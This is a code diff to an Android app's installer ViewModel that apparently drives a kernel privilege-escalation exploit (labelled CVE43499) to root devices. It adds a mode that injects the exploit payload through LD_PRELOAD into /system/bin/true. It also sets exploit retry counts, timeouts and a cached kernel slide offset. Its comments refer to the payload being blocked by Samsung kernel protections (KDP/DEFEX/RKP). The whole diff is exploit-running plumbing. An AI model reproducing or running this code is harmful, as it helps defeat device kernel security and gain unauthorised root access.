@@ -354,55 +354,90 @@ class InstallViewModel(application: Application) : AndroidViewModel(application)
         val launcher = payloads.launcher
         val mmFactory = payloads.mmFactory
         val shizuku = shizukuEnabled()
+        val skipLauncher = AppPreferences.skipStabilityLauncher(app)
         appendLog("[app] runner=${if (shizuku) "shizuku" else "direct"}")
+        appendLog("[app] stability-launcher=${if (skipLauncher) "skipped" else "enabled"}")
         // v0.2.34: pstore dump —— 重启后读上次内核崩溃日志（KDP/DEFEX/RKP 拦截铁证）
         if (shizuku) dumpPstore()
         val helper = helperFile(payloads.helper)
         if (!shizuku) {
             require(helper.canExecute()) { app.getString(R.string.error_helper_unavailable) }
-            require(launcher.canExecute()) { app.getString(R.string.error_launcher_unavailable) }
+            require(skipLauncher || launcher.canExecute()) {
+                app.getString(R.string.error_launcher_unavailable)
+            }
             require(mmFactory == null || mmFactory.canExecute()) {
                 app.getString(R.string.error_mm_factory_unavailable)
             }
         }
         if (AppPreferences.optimizeOnExploit(app)) {
             appendLog("[app] process-quiesce ${StartupOptimizer.apply(app)}")
+            appendLog("[app] process-quiesce cooldown=${PROCESS_QUIESCE_COOLDOWN_MILLIS}ms")
+            delay(PROCESS_QUIESCE_COOLDOWN_MILLIS.milliseconds)
         }
         val logPrefix = mutableState.value.log
         val bootToken = currentBootToken()
         val process = if (shizuku) {
             val stagedPayload = shizukuStage(payload, SHIZUKU_PAYLOAD_PATH, "755")
-            val stagedLauncher = shizukuStage(launcher, SHIZUKU_LAUNCHER_PATH, "755")
             val stagedFactory = mmFactory?.let {
                 shizukuStage(it, SHIZUKU_MM_FACTORY_PATH, "755")
             }
-            val launcherEnv = buildList {
-                cachedP0Offset(bootToken)?.let { add("$P0_OFFSET_ENV=$it") }
-            }.toTypedArray()
-            val command = "exec ${shellQuote(stagedLauncher.absolutePath)} " +
-                "--payload ${shellQuote(stagedPayload.absolutePath)} " +
-                "--helper ${shellQuote(helper.absolutePath)}" +
-                (stagedFactory?.let { " --mm-factory ${shellQuote(it.absolutePath)}" } ?: "") +
-                " 2>&1"
-            ShizukuController.exec(
-                arrayOf("/system/bin/sh", "-c", command),
-                launcherEnv.takeIf { it.isNotEmpty() },
-            )
+            if (skipLauncher) {
+                val environment = directPayloadEnvironment(
+                    stagedPayload.absolutePath,
+                    helper.absolutePath,
+                    stagedFactory?.absolutePath,
+                    cachedP0Offset(bootToken),
+                )
+                ShizukuController.exec(
+                    arrayOf("/system/bin/true"),
+                    environment.entries.map { "${it.key}=${it.value}" }.toTypedArray(),
+                )
+            } else {
+                val stagedLauncher = shizukuStage(launcher, SHIZUKU_LAUNCHER_PATH, "755")
+                val launcherEnv = buildList {
+                    cachedP0Offset(bootToken)?.let { add("$P0_OFFSET_ENV=$it") }
+                }.toTypedArray()
+                val command = "exec ${shellQuote(stagedLauncher.absolutePath)} " +
+                    "--payload ${shellQuote(stagedPayload.absolutePath)} " +
+                    "--helper ${shellQuote(helper.absolutePath)}" +
+                    (stagedFactory?.let { " --mm-factory ${shellQuote(it.absolutePath)}" } ?: "") +
+                    " 2>&1"
+                ShizukuController.exec(
+                    arrayOf("/system/bin/sh", "-c", command),
+                    launcherEnv.takeIf { it.isNotEmpty() },
+                )
+            }
         } else {
-            val command = mutableListOf(
-                launcher.absolutePath,
-                "--payload",
-                payload.absolutePath,
-                "--helper",
-                helper.absolutePath,
-            )
-            mmFactory?.let {
-                command += "--mm-factory"
-                command += it.absolutePath
+            val command = if (skipLauncher) {
+                mutableListOf("/system/bin/true")
+            } else {
+                mutableListOf(
+                    launcher.absolutePath,
+                    "--payload",
+                    payload.absolutePath,
+                    "--helper",
+                    helper.absolutePath,
+                ).apply {
+                    mmFactory?.let {
+                        add("--mm-factory")
+                        add(it.absolutePath)
+                    }
+                }
             }
             val processBuilder = ProcessBuilder(command).redirectErrorStream(true)
             processBuilder.environment().apply {
-                cachedP0Offset(bootToken)?.let { put(P0_OFFSET_ENV, it) }
+                if (skipLauncher) {
+                    putAll(
+                        directPayloadEnvironment(
+                            payload.absolutePath,
+                            helper.absolutePath,
+                            mmFactory?.absolutePath,
+                            cachedP0Offset(bootToken),
+                        ),
+                    )
+                } else {
+                    cachedP0Offset(bootToken)?.let { put(P0_OFFSET_ENV, it) }
+                }
             }
             processBuilder.start()
         }
@@ -910,6 +945,7 @@ class InstallViewModel(application: Application) : AndroidViewModel(application)
         private const val REBOOT_WAIT_POLLS = 25
         private const val REBOOT_WAIT_INTERVAL_MILLIS = 200L
         private const val PAYLOAD_MARKER_TAIL_CHARS = 128
+        private const val PROCESS_QUIESCE_COOLDOWN_MILLIS = 2_000L
         private const val P0_CACHE = "p0_cache"
         private const val P0_CACHE_BOOT_TOKEN = "kernel_boot_id"
         private const val P0_CACHE_OFFSET = "offset"
@@ -934,4 +970,22 @@ class InstallViewModel(application: Application) : AndroidViewModel(application)
         private fun logTail(value: String): String =
             value.lineSequence().toList().takeLast(DISPLAY_LOG_LINES).joinToString("\n")
     }
+}
+
+internal fun directPayloadEnvironment(
+    payloadPath: String,
+    helperPath: String,
+    mmFactoryPath: String?,
+    p0Offset: String?,
+): Map<String, String> = buildMap {
+    put("CVE43499_ROOT_HELPER", helperPath)
+    mmFactoryPath?.let { put("CVE43499_MM_FACTORY", it) }
+    put("EXPLOIT_ATTEMPTS", "3")
+    put("P0_ATTEMPT_TIMEOUT_SEC", "45")
+    put("EXPLOIT_ATTEMPT_TIMEOUT_SEC", "180")
+    put("BOOT_QUIET_SEC", "0")
+    put("FUTEX_WAIT_SEC", "1")
+    put("KSNITCH_REPEAT", "64")
+    put("LD_PRELOAD", payloadPath)
+    p0Offset?.let { put("SLIDE_P0_OFFSET", it) }
 }
